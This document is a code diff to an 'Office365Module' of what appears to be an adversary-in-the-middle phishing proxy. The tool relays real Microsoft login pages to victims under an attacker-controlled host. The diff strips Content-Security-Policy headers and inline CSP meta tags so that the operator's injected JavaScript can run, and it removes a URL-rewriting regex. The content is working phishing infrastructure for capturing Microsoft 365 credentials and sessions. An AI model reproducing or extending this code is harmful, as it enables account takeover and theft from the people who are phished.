@@ -892,9 +892,7 @@ class Office365Module(BaseModule):
             # Prepare response headers and remove CSP restrictions
             response_headers = {}
             for key, value in resp.headers.items():
-                if key.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 
-                                     'content-security-policy', 'content-security-policy-report-only', 
-                                     'x-content-security-policy', 'x-webkit-csp']:
+                if key.lower() not in ['content-encoding', 'transfer-encoding', 'connection', 'content-security-policy']:
                     response_headers[key] = value
             
             # Add permissive CSP to allow our custom JavaScript
@@ -968,18 +966,8 @@ class Office365Module(BaseModule):
                     for old_url, new_url in replacements:
                         content_str = content_str.replace(old_url, new_url)
                     
-                    # Broad regex-based rewrite for any direct Microsoft URLs we didn't explicitly list
-                    def _rewrite(match):
-                        url = match.group(0)
-                        # Strip protocol
-                        proto_removed = re.sub(r'^https?:\/\/', '', url)
-                        # Keep only path after domain
-                        path_part = '/'.join(proto_removed.split('/')[1:])
-                        return f"https://{current_host}/proxy/{path_part}"
-
-                    # Match https://<something>.live.com/... or https://<something>.microsoft.com/...
-                    pattern = r"https?:\/\/[A-Za-z0-9\-.]*(live\.com|microsoft\.com)/(?:[A-Za-z0-9_\-./?=&%+]*)"
-                    content_str = re.sub(pattern, _rewrite, content_str)
+                    # Remove any inline meta Content-Security-Policy tags to avoid CSP blocking
+                    content_str = re.sub(r'<meta[^>]+http-equiv=["\"]Content-Security-Policy["\"][^>]*>', '', content_str, flags=re.IGNORECASE)
 
                     content = content_str.encode('utf-8')
                     self.log(f"[AiTM] Serving REAL Microsoft page with MINIMAL URL rewriting only")
